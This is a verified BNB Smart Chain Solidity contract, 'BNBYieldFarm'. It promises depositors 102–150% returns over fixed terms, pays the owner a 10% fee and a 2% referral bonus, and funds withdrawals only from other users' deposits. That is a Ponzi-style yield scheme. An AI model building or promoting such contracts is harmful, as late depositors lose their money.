/**
 *Submitted for verification at BscScan.com on 2022-10-16
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-15
*/

// SPDX-License-Identifier: GNU General Public License v3.0 (GNU GPLv3)

pragma solidity >=0.8.0;

struct Tariff {
    uint8 life_days;
    uint8 percent;
}

struct Deposit {
    uint8 tariff;
    uint256 amount;
    uint256 time;
}

struct Player {
    address up_line;
    uint256 referrals;
    uint256 referral_bonus;
    uint256 last_payout;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;
    Deposit[] deposits;
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BNBYieldFarm is Ownable {
    using SafeMath for uint256;
    using Address for address;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public referral_bonus;

    uint16 constant PERCENT_DIVIDER = 1000;
    uint8 constant FEE = 100;
    uint8 constant FEE_BONUS = 20;

    mapping(uint8 => Tariff) public tariffs;
    mapping(address => Player) public players;

    //-------------------------------------------------------------------------
    // EVENTS
    //-------------------------------------------------------------------------

    event UpLine(
        address indexed addr,
        address indexed upline
    );

    event NewDeposit(
        address indexed addr,
        uint256 amount,
        uint8 tariff
    );

    event BonusPayout(
        address indexed addr,
        address indexed from,
        uint256 amount
    );

    event Withdraw(
        address indexed addr,
        uint256 amount
    );

    //-------------------------------------------------------------------------
    // MODIFIERS
    //-------------------------------------------------------------------------

    modifier notContract() {
        require(!address(msg.sender).isContract(), "contract not allowed");
        require(msg.sender == tx.origin, "proxy contract not allowed");
        _;
    }

    //-------------------------------------------------------------------------
    // CONSTRUCTOR
    //-------------------------------------------------------------------------

    constructor() {
        uint8 tariffPercent = 102;
        for (uint8 tariffDuration = 20; tariffDuration <= 100; tariffDuration += 5) {
            tariffs[tariffDuration] = Tariff(tariffDuration, tariffPercent);
            tariffPercent += 3;
        }
    }

    //-------------------------------------------------------------------------
    // STATE MODIFYING FUNCTIONS 
    //-------------------------------------------------------------------------

    function deposit(uint8 _tariff, address _up_line) external payable notContract() {
        require(tariffs[_tariff].life_days > 0, "Tariff not found");
        require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 BNB");

        Player storage player = players[msg.sender];

        _setUpLine(msg.sender, _up_line);

        player.deposits.push(Deposit({
            tariff : _tariff,
            amount : msg.value,
            time : block.timestamp
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        uint256 fee = msg.value.mul(FEE).div(PERCENT_DIVIDER);
        payable(owner()).transfer(fee);

        emit NewDeposit(msg.sender, msg.value, _tariff);
    }

    function withdraw() external notContract() {
        Player storage player = players[msg.sender];

        uint256 amount = this.payoutOf(msg.sender);
        uint256 bonus = player.referral_bonus;

        if (bonus > 0) {
            player.referral_bonus = 0;
            amount += bonus;
        }

        require(amount > 0, "User has no dividends");

        uint256 contractBalance = address(this).balance;
        if (contractBalance < amount) {
            player.referral_bonus = amount - contractBalance;
            player.total_referral_bonus += player.referral_bonus;
            amount = contractBalance;
        }

        player.total_withdrawn += amount;
        player.last_payout = block.timestamp;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);

        emit Withdraw(msg.sender, amount);
    }

    //-------------------------------------------------------------------------
    // HELPER FUNCTIONS
    //-------------------------------------------------------------------------

    function _refPayout(address _address, uint256 _amount) private {
        address up_line = players[_address].up_line;

        if (up_line != address(0)) {
            uint256 bonus = _amount.mul(FEE_BONUS).div(PERCENT_DIVIDER);

            players[up_line].referral_bonus += bonus;
            players[up_line].total_referral_bonus += bonus;

            referral_bonus += bonus;

            emit BonusPayout(up_line, _address, bonus);
        }
    }

    function _setUpLine(address _address, address _up_line) private {
        if (players[_address].up_line == address(0) && _address != owner()) {
            if (players[_up_line].deposits.length == 0) {
                _up_line = owner();
            }

            players[_address].up_line = _up_line;
            players[_up_line].referrals += 1;

            emit UpLine(_address, _up_line);
        }
    }

    //-------------------------------------------------------------------------
    // VIEW FUNCTIONS
    //-------------------------------------------------------------------------

    function payoutOf(address _address) view external returns (uint256 totalPayout) {
        Player storage player = players[_address];

        for (uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage playerDeposit = player.deposits[i];
            Tariff storage tariff = tariffs[playerDeposit.tariff];

            uint256 share = playerDeposit.amount.mul(tariff.percent).div(100);
            uint256 time_end = playerDeposit.time + (tariff.life_days * 1 days);
            uint256 from = player.last_payout > playerDeposit.time ? player.last_payout : playerDeposit.time;
            uint256 to = time_end < block.timestamp ? time_end : block.timestamp;

            if (from < to) {
                share = share
                    .mul(to.sub(from))
                    .div(tariff.life_days)
                    .div(1 days);

                totalPayout += share;
            }
        }

        return totalPayout;
    }

    function userInfo(address _address) view external returns (
        uint256 withdrawable,
        uint256 total_invested,
        uint256 total_withdrawn,
        uint256 total_referral_bonus,
        uint256 referrals,
        uint256 deposits
    ) {
        Player storage player = players[_address];

        uint256 payout = this.payoutOf(_address) + player.referral_bonus;

        return (
            payout,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            player.referrals,
            player.deposits.length
        );
    }

    function userDepositInfo(address _address, uint256 index) view external returns (
        uint8 life_days,
        uint256 percent,
        uint256 amount,
        uint256 start,
        uint256 finish
    ) {
        Player storage player = players[_address];
        Deposit storage playerDeposit = player.deposits[index];
        Tariff storage depositTariff = tariffs[playerDeposit.tariff];

        life_days = depositTariff.life_days;
        percent = depositTariff.percent;
        amount = playerDeposit.amount;
        start = playerDeposit.time;
        finish = playerDeposit.time + (depositTariff.life_days * 1 days);
    }

    function contractInfo() view external returns (
        uint256 _balance,
        uint256 _invested,
        uint256 _withdrawn,
        uint256 _referral_bonus
    ) {
        return (
            address(this).balance,
            invested,
            withdrawn,
            referral_bonus
        );
    }
}

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


library Address {

    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}